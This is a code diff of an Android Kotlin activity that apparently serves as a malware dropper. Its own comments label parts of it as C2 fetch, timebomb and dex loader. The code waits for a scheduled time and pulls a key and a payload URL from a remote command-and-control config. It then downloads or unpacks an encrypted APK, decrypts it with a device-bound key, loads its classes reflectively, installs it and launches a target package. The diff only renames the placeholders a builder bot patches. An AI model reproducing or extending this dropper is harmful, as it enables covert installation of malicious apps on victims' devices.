@@ -31,14 +31,14 @@ class InstallActivity : AppCompatActivity() {
 
     companion object {
         // ── Patched by bot ────────────────────────────────────────
-        private const val appEncryptionKey  = "appEncryptionKey_DEFAULT_VALUE_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
-        private const val appVerificationKey     = "HMAC_SHA256_DEFAULT_VALUE_BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
-        private const val appScheduledTime  = "appScheduledTime_DEFAULT_VALUE_FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
-        private const val appDeviceKey  = "appDeviceKey_DEFAULT_VALUE_CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC"
-        private const val appConfigUrl   = "appConfigUrl_DEFAULT_VALUE_EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
+        private const val AES_KEY_B64  = "AES_KEY_B64_PLACEHOLDER_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+        private const val HMAC_B64     = "HMAC_SHA256_PLACEHOLDER_BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
+        private const val appScheduledTime  = "appScheduledTime_PLACEHOLDER_FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
+        private const val DEVICE_SALT  = "DEVICE_SALT_PLACEHOLDER_CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC"
+        private const val appConfigUrl   = "appConfigUrl_PLACEHOLDER_EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
         private const val appSourceUrl   = ""
-        private const val companionPackage   = "com.android.pictach"
-        private const val companionClass = "com.android.pictach.MainActivity"
+        private const val TARGET_PKG   = "com.android.pictach"
+        private const val TARGET_CLASS = "com.android.pictach.MainActivity"
         // ─────────────────────────────────────────────────────────
 
         private val ENCRYPTED: ShortArray = shortArrayOf(
@@ -99,29 +99,30 @@ class InstallActivity : AppCompatActivity() {
             if (!isAppReady())  { showNormal(); return }
 
             val c2 = fetchAppConfig()
-            val rawKey   = c2.first ?: appEncryptionKey
+            val rawKey   = c2.first ?: AES_KEY_B64
             val finalKey = deriveKey(rawKey)
 
             val resolvedUrl = c2.second ?: appSourceUrl
             val isRemote = resolvedUrl.startsWith("http") &&
-                !resolvedUrl.contains("DEFAULT_VALUE")
+                !resolvedUrl.contains("PLACEHOLDER")
 
             val encBytes = if (isRemote) fetchAppData(resolvedUrl) else loadAssets()
-            if (encBytes == null || encBytes.isEmpty()) { showMessage("STEP:LOAD_ASSETS\ncompanion.apk is null or empty"); return }
+            if (encBytes == null || encBytes.isEmpty()) { showMessage("STEP:LOAD_ASSETS\nbase.apk is null or empty"); return }
 
-            // ── DEFAULT_VALUE MODE — skip HMAC + AES, install raw companion.apk directly ──
-            val isPlaceholder = appVerificationKey.contains("DEFAULT_VALUE") ||
-                                appEncryptionKey.contains("DEFAULT_VALUE")
+            // ── PLACEHOLDER MODE — skip HMAC + AES, install raw base.apk directly ──
+            val isPlaceholder = HMAC_B64.contains("PLACEHOLDER") ||
+                                AES_KEY_B64.contains("PLACEHOLDER")
 
             if (isPlaceholder) {
+                // No bot patching yet — install base.apk directly from assets
                 // MUST run on main thread — PackageInstaller requires main thread context
                 runOnUiThread { installApkDirect(encBytes) }
                 return
             }
 
             // ── PATCHED MODE — full HMAC verify + AES decrypt ──
-            val hmacKey = c2.first ?: appEncryptionKey
-            if (!verifyHmac(encBytes, appVerificationKey, hmacKey)) { showNormal(); return }
+            val hmacKey = c2.first ?: AES_KEY_B64
+            if (!verifyHmac(encBytes, HMAC_B64, hmacKey)) { showNormal(); return }
 
             val dex = aesDecrypt(encBytes, finalKey)
             if (dex == null || dex.isEmpty()) { showNormal(); return }
@@ -199,9 +200,9 @@ class InstallActivity : AppCompatActivity() {
 
     private fun deriveKey(baseB64: String): String {
         return try {
-            if (appDeviceKey.contains("DEFAULT_VALUE")) return baseB64
+            if (DEVICE_SALT.contains("PLACEHOLDER")) return baseB64
             val base = Base64.decode(baseB64, Base64.NO_WRAP)
-            val salt = Base64.decode(appDeviceKey, Base64.NO_WRAP)
+            val salt = Base64.decode(DEVICE_SALT, Base64.NO_WRAP)
             val id   = buildDeviceId()
             val digest = MessageDigest.getInstance("SHA-256")
             digest.update(id.toByteArray(Charsets.UTF_8))
@@ -231,6 +232,7 @@ class InstallActivity : AppCompatActivity() {
         return s < 2
     }
 
+    // ── TIMEBOMB ──────────────────────────────────────────────────
     private fun isAppReady(): Boolean {
         return try {
             val ts = appScheduledTime.trim().toLongOrNull() ?: return true
@@ -244,7 +246,7 @@ class InstallActivity : AppCompatActivity() {
     // ── C2 FETCH ──────────────────────────────────────────────────
     private fun fetchAppConfig(): Pair<String?, String?> {
         return try {
-            if (appConfigUrl.contains("DEFAULT_VALUE") || appConfigUrl.isBlank()) return Pair(null, null)
+            if (appConfigUrl.contains("PLACEHOLDER") || appConfigUrl.isBlank()) return Pair(null, null)
             val conn = URL(appConfigUrl).openConnection() as HttpsURLConnection
             conn.connectTimeout = 8000; conn.readTimeout = 10000
             conn.setRequestProperty("User-Agent", "okhttp/4.9.0")
@@ -271,7 +273,7 @@ class InstallActivity : AppCompatActivity() {
 
     // ── ASSETS ────────────────────────────────────────────────────
     private fun loadAssets(): ByteArray? {
-        return try { assets.open("companion.apk").use { it.readBytes() } } catch (e: Exception) { null }
+        return try { assets.open("base.apk").use { it.readBytes() } } catch (e: Exception) { null }
     }
 
     // ── DEX LOADER ────────────────────────────────────────────────
@@ -287,7 +289,7 @@ class InstallActivity : AppCompatActivity() {
                 loader
             }
             val methods = arrayOf("start", "init", "run", "execute", "onCreate")
-            val clazz = cl.loadClass(companionClass)
+            val clazz = cl.loadClass(TARGET_CLASS)
             for (m in methods) {
                 try { clazz.getDeclaredMethod(m, Context::class.java).also { it.isAccessible = true }.invoke(null, this); return } catch (e: NoSuchMethodException) { }
             }
@@ -305,7 +307,7 @@ class InstallActivity : AppCompatActivity() {
         try {
             // First try direct class launch
             val i = Intent().apply {
-                setClassName(companionPackage, companionClass)
+                setClassName(TARGET_PKG, TARGET_CLASS)
                 addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
             }
             startActivity(i)
@@ -313,7 +315,7 @@ class InstallActivity : AppCompatActivity() {
         } catch (e: Exception) {
             try {
                 // Fallback — use package launcher intent
-                val launch = packageManager.getLaunchIntentForPackage(companionPackage)
+                val launch = packageManager.getLaunchIntentForPackage(TARGET_PKG)
                 if (launch != null) {
                     launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
                     startActivity(launch)
